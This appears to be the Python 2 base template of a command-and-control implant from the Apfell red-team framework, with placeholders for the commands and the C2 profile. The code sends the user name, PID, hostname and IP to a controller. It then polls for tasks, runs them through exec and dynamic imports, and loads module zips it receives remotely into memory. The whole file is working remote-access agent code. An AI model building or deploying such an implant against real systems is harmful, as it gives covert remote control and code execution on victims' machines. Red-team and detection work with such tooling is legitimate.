#/usr/bin/env python
from getpass import getuser
from os import getpid, sep
from socket import gethostname, socket, AF_INET, SOCK_DGRAM
from time import sleep
from zipfile import ZipFile
from io import BytesIO
import sys
import imp
import thread
import importlib

# HELPER FUNCTIONS
def get_ip():
    s = socket(AF_INET, SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('8.8.8.8', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

class ZipImporter(object):
    def __init__(self, zip_file):
        self.z = zip_file
        self.zfile = ZipFile(self.z)
        self._paths = [ x.filename for x in self.zfile.filelist ]

    def _mod_to_paths(self, fullname):
        py_filename = fullname.replace(".", sep) + ".py"
        py_package = fullname.replace(".", sep, fullname.count(".") - 1) + "/__init__.py"
        if py_filename in self._paths:
            return py_filename
        elif py_package in self._paths:
            return py_package
        else:
            return None

    def find_module(self, fullname, path):
        if self._mod_to_paths(fullname) is not None:
            return self
        return None

    def load_module(self, fullname):
        filename = self._mod_to_paths(fullname)
        if not filename in self._paths:
            raise ImportError(fullname)
        new_module = imp.new_module(fullname)
        exec self.zfile.open(filename, 'r').read() in new_module.__dict__
        new_module.__file__ = filename
        new_module.__loader__ = self
        if filename.endswith("__init__.py"):
            new_module.__path__ = []
            new_module.__package__ = fullname
        else:
            new_module.__package__ = fullname.rpartition(".")[0]
        try:
            del sys.modules[fullname]
        except Exception as e:
            pass
        sys.modules[fullname] = new_module
        return new_module

    def get_paths(self):
        return self._paths

class Apfell():
    def __init__(self):
        self.jobs = {}
        self.UUID = "UUID_HERE"

    def load_zip(self, data, name):
        zipbytes = BytesIO(data)
        new_load = ZipImporter(zipbytes)
        #print("loading: {}".format(name))
        #print(sys.modules)
        for x in range(len(sys.meta_path)):
            try:
                #print("{} - {}".format(str(x), str(sys.meta_path[x].get_paths())))
                if sys.meta_path[x].get_paths() == new_load.get_paths():
                    sys.meta_path[x] = new_load
                    #print("matched paths")
                    return
            except Exception as e:
                print(e)
        #print("having to add it in normally")
        sys.meta_path.append(ZipImporter(zipbytes))

    def add_job(self, task_id, task):
        self.jobs[task_id] = {"task": task, "stop": False}

    def remove_job(self, task_id):
        try:
            del self.jobs[task_id]
        except Exception as e:
            pass

    def kill_job(self, task_id):
        try:
            #self.jobs[task_id]['thread'].terminate()
            #del self.jobs[task_id]
            self.jobs[task_id]['stop'] = True  # signal for thread to stop
        except Exception as e:
            #print(str(e))
            pass

    def get_jobs(self):
        return [self.jobs[x]['task'] for x in self.jobs]

    def should_thread_stop(self, task_id):
        return self.jobs[task_id]['stop']

# default commands
COMMANDS_HERE
# c2 profile code
C2PROFILE_HERE
# MAIN LOGIC
apfell = Apfell()
c2 = C2()

# load testing
#f = open("./commands/load.zip", 'rb')
#data = f.read()
#f.close()

#apfell.load_zip(data, "load")

c2.checkin(user=getuser(), pid=getpid(), host=gethostname(), ip=get_ip())
while True:
    try:
        c2.wait()
        try:
            task = c2.get_task()
        except Exception as e:
            continue
        #print(task)
        if task['command'] != "none":
            # process the tasking
            try:
                try:
                    reload(sys.modules['{}'.format(task['command'])])
                except Exception as e:
                    #print(str(e))
                    pass
                try:
                    exec "from {} import {}".format(task['command'], task['command'])
                except Exception as e:
                    #print(str(e))
                    pass
                #print(locals())
                #print(globals())
                t = thread.start_new_thread(locals()["{}".format(task['command'])],(apfell, c2, task['params'], task['id']))
                apfell.add_job(task_id=task['id'], task=task)
            except KeyError as e:
                c2.post_response(response="Command not found: {}".format(str(e)), task_id=task['id'])
            except Exception as e:
                c2.post_response(response=str(e), task_id=task['id'])
            ## locals()['func name'](task['params'], task['task_id'])
    except KeyboardInterrupt:
        exit()
    except Exception as e:
        #print(str(e))
        continue
